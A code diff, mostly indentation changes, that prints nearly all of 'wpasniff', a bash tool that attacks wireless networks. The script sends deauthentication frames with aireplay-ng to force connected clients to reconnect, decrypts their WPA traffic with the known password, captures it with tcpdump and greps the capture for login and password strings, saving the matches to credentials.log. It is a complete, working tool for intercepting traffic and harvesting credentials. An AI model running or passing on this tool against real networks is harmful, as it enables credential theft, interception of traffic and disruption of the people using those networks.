@@ -27,7 +27,6 @@ HOST_FILTER_STRING=
 trap stop SIGINT
 
 usage(){
-
 cat <<EOF
 wpasnff  	[Options]	[Arguments]
 		
@@ -45,28 +44,27 @@ Examples : wpasniff -t xx:xx:xx:xx:xx:xx+password -p http,arp -v sxx:xx:xx:xx:xx
 	   s letter before address means src address	
 	   t letter before address means dst address	     
 EOF
-
 }
 
 stop(){
-service network-manager start &>/dev/null
-killall xterm &> /dev/null
-rm "$AIRMON_OUTPUT" &> /dev/null  ; rm "$AIRODUMP_OUTPUT" &> /dev/null ; rm "$WORKING_CHANNEL" &> /dev/null
+	service network-manager start &>/dev/null
+	killall xterm &> /dev/null
+	rm "$AIRMON_OUTPUT" &> /dev/null  ; rm "$AIRODUMP_OUTPUT" &> /dev/null ; rm "$WORKING_CHANNEL" &> /dev/null
 
-echo -e "[+] Created "${GREEN}"capture.pcap"${NC}""
+	echo -e "[+] Created "${GREEN}"capture.pcap"${NC}""
 
-[ "$CAPTURE" -eq "1" ] && tcpdump -qs 0 -A -r -l capture.pcap &> capture.log && \
-	egrep -i  'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd= |password=|pass:|user:|username:|password:|login:|pass |user'  \
-	-B20 capture.log > credentials.log && \
-	echo -e "[+] Created "${GREEN}"credentials.log"${NC}"" && rm capture.log
+	[ "$CAPTURE" -eq "1" ] && tcpdump -qs 0 -A -r -l capture.pcap &> capture.log && \
+		egrep -i  'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd= |password=|pass:|user:|username:|password:|login:|pass |user'  \
+		-B20 capture.log > credentials.log && \
+		echo -e "[+] Created "${GREEN}"credentials.log"${NC}"" && rm capture.log
 
-exit 
+	exit 
 }
 
 mac_validation(){
-local status=1
-[[ $1 =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && status=$? 
-return $status
+	local status=1
+	[[ $1 =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && status=$? 
+	return $status
 }
 
 ip_validation(){
@@ -77,274 +75,274 @@ ip_validation(){
 }
 
 packet_convert_filter(){
-case "$1" in 
-	get)	PACKET_FILTER_STRING+=" tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420 or" ;;
-	post)	PACKET_FILTER_STRING+=" tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504F5354 or" ;;
-	ftp)    PACKET_FILTER_STRING+=" port ftp or ftp-data or" ;;
-	snmp)   PACKET_FILTER_STRING+=" udp port 161 or udp port 162 or" ;;
-	dns)    PACKET_FILTER_STRING+=" port 53 or" ;;
-	dhcp)   PACKET_FILTER_STRING+=" port 67 or 68 or" ;;
-	http|pop3|smtp|imap) PACKET_FILTER_STRING+=" port "$1" or" ;;
-	icmp|arp) PACKET_FILTER_STRING+=" "$1" or" ;;
-esac
+	case "$1" in 
+		get)	PACKET_FILTER_STRING+=" tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420 or" ;;
+		post)	PACKET_FILTER_STRING+=" tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504F5354 or" ;;
+		ftp)    PACKET_FILTER_STRING+=" port ftp or ftp-data or" ;;
+		snmp)   PACKET_FILTER_STRING+=" udp port 161 or udp port 162 or" ;;
+		dns)    PACKET_FILTER_STRING+=" port 53 or" ;;
+		dhcp)   PACKET_FILTER_STRING+=" port 67 or 68 or" ;;
+		http|pop3|smtp|imap) PACKET_FILTER_STRING+=" port "$1" or" ;;
+		icmp|arp) PACKET_FILTER_STRING+=" "$1" or" ;;
+	esac
 }
 
 # Check if the string starts with 's' or 't' char and convert it with the corresponding tcpdump filter
 host_convert_filter(){
-local prefix=$(egrep -o '^s|t' <<< "$1")
-if [ -z "$prefix" ]; then
-	if  ip_validation "$1" ; then
-		 HOST_FILTER_STRING+=" host "$1" and"
-	else
-		if  mac_validation "$1" ; then
-			 HOST_FILTER_STRING+=" ether host "$1" and"
+	local prefix=$(egrep -o '^s|t' <<< "$1")
+	if [ -z "$prefix" ]; then
+		if  ip_validation "$1" ; then
+			HOST_FILTER_STRING+=" host "$1" and"
 		else
-			usage && echo -e ""${RED}"[!] Invalid type address"${NC}"\n" 1>&2 && exit 1
+			if  mac_validation "$1" ; then
+				HOST_FILTER_STRING+=" ether host "$1" and"
+			else
+				usage && echo -e ""${RED}"[!] Invalid type address"${NC}"\n" 1>&2 && exit 1
+			fi
+		fi		 
+	else 	
+		if [  "$prefix" == 's' ]; then
+			if  ip_validation "${1#?}" ; then
+				HOST_FILTER_STRING+=" src host "${1#?}" and"
+			else
+				if  mac_validation "${1#?}" ; then
+					HOST_FILTER_STRING+=" ether src "${1#?}" and"
+				else
+					usage && echo -e ""${RED}"[!] Invalid type address"${NC}"\n" 1>&2 && exit 1
+				fi
+			fi
+		elif [  "$prefix" == 't' ]; then
+			if  ip_validation "${1#?}" ; then
+				HOST_FILTER_STRING+=" dst host "${1#?}" and"
+			else
+				if  mac_validation "${1#?}" ; then
+					HOST_FILTER_STRING+=" ether dst "${1#?}" and"
+				else
+					usage && echo -e ""${RED}"[!] Invalid type address"${NC}"\n" 1>&2 && exit 1
+				fi
+			fi	
 		fi
-	fi		 
-else 	
-	if [  "$prefix" == 's' ]; then
-		if  ip_validation "${1#?}" ; then
-			 HOST_FILTER_STRING+=" src host "${1#?}" and"
-		else
-			if  mac_validation "${1#?}" ; then
-				 HOST_FILTER_STRING+=" ether src "${1#?}" and"
-			else
-				usage && echo -e ""${RED}"[!] Invalid type address"${NC}"\n" 1>&2 && exit 1
-			fi
-	    fi
-	elif [  "$prefix" == 't' ]; then
-		if  ip_validation "${1#?}" ; then
-			 HOST_FILTER_STRING+=" dst host "${1#?}" and"
-		else
-			if  mac_validation "${1#?}" ; then
-				 HOST_FILTER_STRING+=" ether dst "${1#?}" and"
-			else
-				usage && echo -e ""${RED}"[!] Invalid type address"${NC}"\n" 1>&2 && exit 1
-			fi
-	    fi	
 	fi
-fi
 }
 
 target_control(){
-local TARGET_ARGUMENTS=(${1//+/ }) 
-if [ "${#TARGET_ARGUMENTS[@]}" -lt "2" ];then
-		usage && echo -e ""${RED}"[!] BSSID and PSK must be passed to the script"${NC}"\n" 1>&2 && exit 1
-	else
-		if  mac_validation "${TARGET_ARGUMENTS[0]}"; then 
-			BSSID="${TARGET_ARGUMENTS[0]}"
-			PSK="${TARGET_ARGUMENTS[1]}"		
-		else 
-			usage && echo -e ""${RED}"[!] Invalid BSSID"${NC}"\n" 1>&2 && exit 1
+	local TARGET_ARGUMENTS=(${1//+/ }) 
+	if [ "${#TARGET_ARGUMENTS[@]}" -lt "2" ];then
+			usage && echo -e ""${RED}"[!] BSSID and PSK must be passed to the script"${NC}"\n" 1>&2 && exit 1
+		else
+			if  mac_validation "${TARGET_ARGUMENTS[0]}"; then 
+				BSSID="${TARGET_ARGUMENTS[0]}"
+				PSK="${TARGET_ARGUMENTS[1]}"		
+			else 
+				usage && echo -e ""${RED}"[!] Invalid BSSID"${NC}"\n" 1>&2 && exit 1
+			fi
 		fi
-	 fi
 }
 
 packets_control(){
-PACKETS_FILTER=(${1//,/ })
-for (( i=0; i<$((${#PACKETS_FILTER[@]})); i++ ))
-	do
-		if [[ ${PACKETS_FILTER[$i]} =~ ^(http|dns|pop3|ftp|smtp|imap|get|post|snmp|icmp|arp|dhcp)$ ]]; then
-			packet_convert_filter ${PACKETS_FILTER[$i]}
-		else
-			usage && echo -e ""${RED}"[!] Packet filter not managed"${NC}"\n" 1>&2 &&  exit 1
-		fi
-	done
+	PACKETS_FILTER=(${1//,/ })
+	for (( i=0; i<$((${#PACKETS_FILTER[@]})); i++ ))
+		do
+			if [[ ${PACKETS_FILTER[$i]} =~ ^(http|dns|pop3|ftp|smtp|imap|get|post|snmp|icmp|arp|dhcp)$ ]]; then
+				packet_convert_filter ${PACKETS_FILTER[$i]}
+			else
+				usage && echo -e ""${RED}"[!] Packet filter not managed"${NC}"\n" 1>&2 &&  exit 1
+			fi
+		done
 }
 
 
 host_control(){
-HOST_FILTER=(${1//,/ })
-for (( i=0; i<$((${#HOST_FILTER[@]})); i++ ))
-	do
-		host_convert_filter "${HOST_FILTER[$i]}"
-	done
-	# Remove last occurance from string containing host filters
-	HOST_FILTER_STRING=$(sed 's/and$//' <<< "$HOST_FILTER_STRING")
+	HOST_FILTER=(${1//,/ })
+	for (( i=0; i<$((${#HOST_FILTER[@]})); i++ ))
+		do
+			host_convert_filter "${HOST_FILTER[$i]}"
+		done
+		# Remove last occurance from string containing host filters
+		HOST_FILTER_STRING=$(sed 's/and$//' <<< "$HOST_FILTER_STRING")
 }
 
 
 print_stations(){
-local information=($(grep -E 'client-mac|client-manuf' "$AIRODUMP_OUTPUT"  | cut -d '>' -f 2 | cut -d '<' -f 1 |  sed 's/ /_/g' | tr '\n' ' ' ))
-local cont=1
-for (( i=0; i<$((${#information[@]})); i=i+2 ))
-	do
-		printf "%d)\t %s \t %s \t \t\n" $cont  ${information[$i]} ${information[$i+1]} && \
-		STATIONS+=(["$cont"]="${information[$i]}") && ((cont++))
-	done 
-echo -e "\n"
+	local information=($(grep -E 'client-mac|client-manuf' "$AIRODUMP_OUTPUT"  | cut -d '>' -f 2 | cut -d '<' -f 1 |  sed 's/ /_/g' | tr '\n' ' ' ))
+	local cont=1
+	for (( i=0; i<$((${#information[@]})); i=i+2 ))
+		do
+			printf "%d)\t %s \t %s \t \t\n" $cont  ${information[$i]} ${information[$i+1]} && \
+			STATIONS+=(["$cont"]="${information[$i]}") && ((cont++))
+		done 
+	echo -e "\n"
 }
 
 
 deauthentication(){
-local stn_to_remove=()
-echo "Press any key -> Deauthenticate all clients"
-echo "Press [S|s] -> Select specifics client/s"
+	local stn_to_remove=()
+	echo "Press any key -> Deauthenticate all clients"
+	echo "Press [S|s] -> Select specifics client/s"
 
-read -p "Choose : " ch;
+	read -p "Choose : " ch;
 
-case "$ch" in 
-S|s) 	echo "[+] Insert the corrispondent number of target station to remove from targets list [0 to exit]"
-	echo "Example -> 1,3,5 (this output will remove target station associated with this number)"
-	read -p "[+] Associatives numbers :  " list; 
-	stn_to_remove=(${list//,/ })
-	for (( i=0; i<$((${#stn_to_remove[@]})); i++ ))
-		do 
-			unset STATIONS["${stn_to_remove[$i]}"]	&>/dev/null 
-		done;;
-*)  ;;
-esac
+	case "$ch" in 
+	S|s) 	echo "[+] Insert the corrispondent number of target station to remove from targets list [0 to exit]"
+		echo "Example -> 1,3,5 (this output will remove target station associated with this number)"
+		read -p "[+] Associatives numbers :  " list; 
+		stn_to_remove=(${list//,/ })
+		for (( i=0; i<$((${#stn_to_remove[@]})); i++ ))
+			do 
+				unset STATIONS["${stn_to_remove[$i]}"]	&>/dev/null 
+			done;;
+	*)  ;;
+	esac
 
-read -p "[*] Insert numbers of packets to send to target clients [DEFAULT=1] : " packets;
+	read -p "[*] Insert numbers of packets to send to target clients [DEFAULT=1] : " packets;
 
-if [[ ! $packets =~  ^[0-9]+$ ]] || [ "$packets" -eq "0" ] ; then
-	packets=1
-fi
-echo -e "[*] Starting aireplay to deauthenticate clients connected to target AP...\n"
-sleep 2
+	if [[ ! $packets =~  ^[0-9]+$ ]] || [ "$packets" -eq "0" ] ; then
+		packets=1
+	fi
+	echo -e "[*] Starting aireplay to deauthenticate clients connected to target AP...\n"
+	sleep 2
 
-for stn in ${!STATIONS[@]}
-	do
-		aireplay-ng --deauth "$packets" -a "$BSSID" -c "${STATIONS[$stn]}"  "$monINT" 
-		sleep 0.5
-	done
+	for stn in ${!STATIONS[@]}
+		do
+			aireplay-ng --deauth "$packets" -a "$BSSID" -c "${STATIONS[$stn]}"  "$monINT" 
+			sleep 0.5
+		done
 }
 
 # Back to 2.4GHz frequency in case the wireless card does not support 5GHz frequency
 frequency_control(){
-[ $(iwlist "$1" channel  | cut -d':' -f1 | grep -oE '[0-9]{2,3}' | sed -n '1!p' | wc -l) -lt "14" ] && \
-echo -e ""${RED}"[!] Your wireless card not support 5GHz frequency.It will set 2.4GHz frequency"${NC}"" && BAND=bg
+	[ $(iwlist "$1" channel  | cut -d':' -f1 | grep -oE '[0-9]{2,3}' | sed -n '1!p' | wc -l) -lt "14" ] && \
+	echo -e ""${RED}"[!] Your wireless card not support 5GHz frequency.It will set 2.4GHz frequency"${NC}"" && BAND=bg
 }
 
 disable_bad_processes(){
-for (( i=0; i<$((${#W_INT[@]})); i++ ))
-	do
-		[ -z $(echo "${W_INT[$i]}" | egrep  '^wlan|mon|wlp|wlx$' | cut -d ":" -f 1 ) ] && ifconfig "${W_INT[$i]}" down &>/dev/null
-	done 
-killall wpa_supplicant &>/dev/null && [ -f "$NETMAN" ] && service network-manager stop &>/dev/null || service wicd stop &>/dev/null	
+	for (( i=0; i<$((${#W_INT[@]})); i++ ))
+		do
+			[ -z $(echo "${W_INT[$i]}" | egrep  '^wlan|mon|wlp|wlx$' | cut -d ":" -f 1 ) ] && ifconfig "${W_INT[$i]}" down &>/dev/null
+		done 
+	killall wpa_supplicant &>/dev/null && [ -f "$NETMAN" ] && service network-manager stop &>/dev/null || service wicd stop &>/dev/null	
 }
 
 reactivate_bad_processes(){
-for (( i=0; i<$((${#W_INT[@]})); i++ ))
-	 do 
-		ifconfig "${W_INT[$i]}" up &>/dev/null 
-	done 
-[ -f "$NETMAN" ] && service network-manager start &>/dev/null || service wicd start &>/dev/null
+	for (( i=0; i<$((${#W_INT[@]})); i++ ))
+		do 
+			ifconfig "${W_INT[$i]}" up &>/dev/null 
+		done 
+	[ -f "$NETMAN" ] && service network-manager start &>/dev/null || service wicd start &>/dev/null
 }
 
 interface_control(){
-local INT=
-for dev in $(ls /sys/class/net); do
- 	 [ -d "/sys/class/net/$dev/wireless" ] && W_INT+=("$dev") 
-done
+	local INT=
+	for dev in $(ls /sys/class/net); do
+		[ -d "/sys/class/net/$dev/wireless" ] && W_INT+=("$dev") 
+	done
 
-if [[ -z $(cat  /proc/net/dev  | egrep '^wlan|mon|wlp|wlx$' | cut -d ':' -f 1 | sed 's/ //g') ]]; then
-	case  "${#W_INT[@]}" in
-	0)	echo -e ""${RED}"[!] Wireless interface not found"${NC}"\n" 1>&2 && exit 1
-		;;
-	1)	INT="${W_INT[@]}"
-		echo -e "[+] Detected "${GREEN}""$INT""${NC}" interface"
-		;;
-	*)	echo  "[!] Detected more wireless interfaces : "
-		for (( i=0; i<$((${#W_INT[@]})); i++ ))
-		do
-			echo -e  "[+] "${GREEN}""${W_INT[$i]}""${NC}""
-		done
-		echo -e "\n"
-		while [ -z $(grep -ow "$INT" <<< "${W_INT[@]}") ]; do 
-			read -p "[*] Choose the interface to put on monitor mode > " INT; done
-		;;
-	esac
+	if [[ -z $(cat  /proc/net/dev  | egrep '^wlan|mon|wlp|wlx$' | cut -d ':' -f 1 | sed 's/ //g') ]]; then
+		case  "${#W_INT[@]}" in
+		0)	echo -e ""${RED}"[!] Wireless interface not found"${NC}"\n" 1>&2 && exit 1
+			;;
+		1)	INT="${W_INT[@]}"
+			echo -e "[+] Detected "${GREEN}""$INT""${NC}" interface"
+			;;
+		*)	echo  "[!] Detected more wireless interfaces : "
+			for (( i=0; i<$((${#W_INT[@]})); i++ ))
+			do
+				echo -e  "[+] "${GREEN}""${W_INT[$i]}""${NC}""
+			done
+			echo -e "\n"
+			while [ -z $(grep -ow "$INT" <<< "${W_INT[@]}") ]; do 
+				read -p "[*] Choose the interface to put on monitor mode > " INT; done
+			;;
+		esac
 
-	airmon-ng start "$INT" &> "$AIRMON_OUTPUT"
-	if  [ ! -z $(grep -o 'NOT' "$AIRMON_OUTPUT") ]; then
-		echo -e ""${RED}"[!] It seems your wireless card can't create monitor interface with airmon-ng"${NC}"" \
-			""${RED}"[!] Check out for driver or chipset your wireless card use"${NC}"" \
-			""${RED}"[!] Visit https://www.aircrack-ng.org/install.html for more information\n"${NC}"" 1>&2 && exit 1
-	fi
+		airmon-ng start "$INT" &> "$AIRMON_OUTPUT"
+		if  [ ! -z $(grep -o 'NOT' "$AIRMON_OUTPUT") ]; then
+			echo -e ""${RED}"[!] It seems your wireless card can't create monitor interface with airmon-ng"${NC}"" \
+				""${RED}"[!] Check out for driver or chipset your wireless card use"${NC}"" \
+				""${RED}"[!] Visit https://www.aircrack-ng.org/install.html for more information\n"${NC}"" 1>&2 && exit 1
+		fi
 
-	echo -e "[+] Created monitor interface of "${GREEN}""$INT""${NC}""
-	monINT=$(cat  /proc/net/dev  | egrep '^wlan|mon|wlp|wlx$' | cut -d ':' -f 1 | sed 's/ //g')
-else
-	local MON_INT_LIST=($(cat  /proc/net/dev  | egrep '^wlan|mon|wlp|wlx$' | cut -d ':' -f 1 | sed 's/ //g'))
-	if [ "${#MON_INT_LIST[@]}" -eq "1" ]; then
-		monINT="${MON_INT_LIST[@]}"
+		echo -e "[+] Created monitor interface of "${GREEN}""$INT""${NC}""
+		monINT=$(cat  /proc/net/dev  | egrep '^wlan|mon|wlp|wlx$' | cut -d ':' -f 1 | sed 's/ //g')
 	else
-		echo -e "[+] Availables monitor mode interfaces : \n"
-		for (( i=0; i<$((${#MON_INT_LIST[@]})); i++ ))
-		do
-			echo -e  "[+] "${GREEN}""${MON_INT_LIST[$i]}""${NC}""
-		done	
-		echo -e "\n"
-		while [ -z "$monINT" ] || [ -z $( grep -ow "$monINT" <<< "${MON_INT_LIST[@]}" ) ]; do 
-			read -p "[*] Insert monitor interface  > " monINT; done
+		local MON_INT_LIST=($(cat  /proc/net/dev  | egrep '^wlan|mon|wlp|wlx$' | cut -d ':' -f 1 | sed 's/ //g'))
+		if [ "${#MON_INT_LIST[@]}" -eq "1" ]; then
+			monINT="${MON_INT_LIST[@]}"
+		else
+			echo -e "[+] Availables monitor mode interfaces : \n"
+			for (( i=0; i<$((${#MON_INT_LIST[@]})); i++ ))
+			do
+				echo -e  "[+] "${GREEN}""${MON_INT_LIST[$i]}""${NC}""
+			done	
+			echo -e "\n"
+			while [ -z "$monINT" ] || [ -z $( grep -ow "$monINT" <<< "${MON_INT_LIST[@]}" ) ]; do 
+				read -p "[*] Insert monitor interface  > " monINT; done
+		fi
+		
 	fi
-	
-fi
 
-[ $(expr $(wc -m <<< "$BAND") - 1 ) -eq "1" ] && frequency_control "$monINT"
+	[ $(expr $(wc -m <<< "$BAND") - 1 ) -eq "1" ] && frequency_control "$monINT"
 
-echo -e "[+] Using "${GREEN}""$monINT""${NC}" as monitor interface"
-sleep 2
+	echo -e "[+] Using "${GREEN}""$monINT""${NC}" as monitor interface"
+	sleep 2
 }
 
 get_clients(){
-xterm -hold -e airodump-ng -c "$CH" --write /tmp/data --bssid "$BSSID"  --output-format netxml  "$monINT" &
-read -p "[+] Press [ENTER] to kill airodump" stop;
-killall xterm &> /dev/null
+	xterm -hold -e airodump-ng -c "$CH" --write /tmp/data --bssid "$BSSID"  --output-format netxml  "$monINT" &
+	read -p "[+] Press [ENTER] to kill airodump" stop;
+	killall xterm &> /dev/null
 }
 
 control_existence_and_get_target_channel(){
-xterm -hold -e airodump-ng  --write /tmp/channel --bssid "$BSSID" --band "$BAND"  --output-format netxml "$monINT" &
-sleep 7
+	xterm -hold -e airodump-ng  --write /tmp/channel --bssid "$BSSID" --band "$BAND"  --output-format netxml "$monINT" &
+	sleep 7
 
-ESSID=$(grep -E 'essid' "$WORKING_CHANNEL"  | cut -d '>' -f 2 | cut -d '<' -f 1 )
-[ -z "$ESSID" ] && echo -e ""${RED}"[!] No AP found "${NC}"" 1>&2 && killall xterm &> /dev/null && exit 1
-CH=$(grep -E 'channel' "$WORKING_CHANNEL"  | cut -d '>' -f 2 | cut -d '<' -f 1 | head -n1)
-killall xterm &> /dev/null
+	ESSID=$(grep -E 'essid' "$WORKING_CHANNEL"  | cut -d '>' -f 2 | cut -d '<' -f 1 )
+	[ -z "$ESSID" ] && echo -e ""${RED}"[!] No AP found "${NC}"" 1>&2 && killall xterm &> /dev/null && exit 1
+	CH=$(grep -E 'channel' "$WORKING_CHANNEL"  | cut -d '>' -f 2 | cut -d '<' -f 1 | head -n1)
+	killall xterm &> /dev/null
 
-echo -e "ESSID:			"${GREEN}""$ESSID""${NC}""
-echo -e "WORKING CHANNEL:	"${GREEN}""$CH""${NC}"\n"
+	echo -e "ESSID:			"${GREEN}""$ESSID""${NC}""
+	echo -e "WORKING CHANNEL:	"${GREEN}""$CH""${NC}"\n"
 }
 
 main(){
-echo -e ""${RED}"[!] Network-manager and all wireless interfaces will be stopped"${NC}""
-echo -e ""${RED}"[!] They will be reactivated after aireplay execution"${NC}"\n"
- 
-disable_bad_processes 
+	echo -e ""${RED}"[!] Network-manager and all wireless interfaces will be stopped"${NC}""
+	echo -e ""${RED}"[!] They will be reactivated after aireplay execution"${NC}"\n"
+	
+	disable_bad_processes 
 
-echo -e "[*] Checking out for AP and obtaining working AP channel...\n"
-control_existence_and_get_target_channel
-sleep 2
+	echo -e "[*] Checking out for AP and obtaining working AP channel...\n"
+	control_existence_and_get_target_channel
+	sleep 2
 
-echo -e "[*] Capturing stations connected to the AP ... "
-get_clients
-sleep 2
+	echo -e "[*] Capturing stations connected to the AP ... "
+	get_clients
+	sleep 2
 
-echo -e "\n"${GREEN}"\t \t \t \t SUMMARY"${NC}"\n"
-echo -e "#########################################################################\n"
-echo -e ""${GREEN}"\t  STATION \t \t  VENDOR \t"${NC}"\n"
+	echo -e "\n"${GREEN}"\t \t \t \t SUMMARY"${NC}"\n"
+	echo -e "#########################################################################\n"
+	echo -e ""${GREEN}"\t  STATION \t \t  VENDOR \t"${NC}"\n"
 
-print_stations
+	print_stations
 
-echo -e "[*] Starting dot11decrypt to capture clients handshake...\n"
-sleep 2
+	echo -e "[*] Starting dot11decrypt to capture clients handshake...\n"
+	sleep 2
 
-xterm -hold -e dot11decrypt "$monINT" wpa:"$ESSID":"$PSK" &
+	xterm -hold -e dot11decrypt "$monINT" wpa:"$ESSID":"$PSK" &
 
-deauthentication
+	deauthentication
 
-echo "[+] Reactivating wireless interfaces and Network-manager"
-reactivate_bad_processes
+	echo "[+] Reactivating wireless interfaces and Network-manager"
+	reactivate_bad_processes
 
-echo "[+] Capture started.Press CTRL+C to stop "
+	echo "[+] Capture started.Press CTRL+C to stop "
 
-# Remove latest 'or' or 'and' occurance from the string containing packets filters
-[ "${#HOST_FILTER[@]}" -eq "0" ] && PACKET_FILTER_STRING=$(sed 's/or$//' <<< "$PACKET_FILTER_STRING") || \
-PACKET_FILTER_STRING=$(sed 's/or$/and/'<<< "$PACKET_FILTER_STRING")
+	# Remove latest 'or' or 'and' occurance from the string containing packets filters
+	[ "${#HOST_FILTER[@]}" -eq "0" ] && PACKET_FILTER_STRING=$(sed 's/or$//' <<< "$PACKET_FILTER_STRING") || \
+	PACKET_FILTER_STRING=$(sed 's/or$/and/'<<< "$PACKET_FILTER_STRING")
 
-tcpdump -lnni $(ip tuntap | cut -d ':' -f1) -s 0 -A -w capture.pcap "$PACKET_FILTER_STRING""$HOST_FILTER_STRING" &>/dev/null        		       
+	tcpdump -lnni $(ip tuntap | cut -d ':' -f1) -s 0 -A -w capture.pcap "$PACKET_FILTER_STRING""$HOST_FILTER_STRING" &>/dev/null        		       
 }
 
 if [ $(id -u) != "0" ]; then
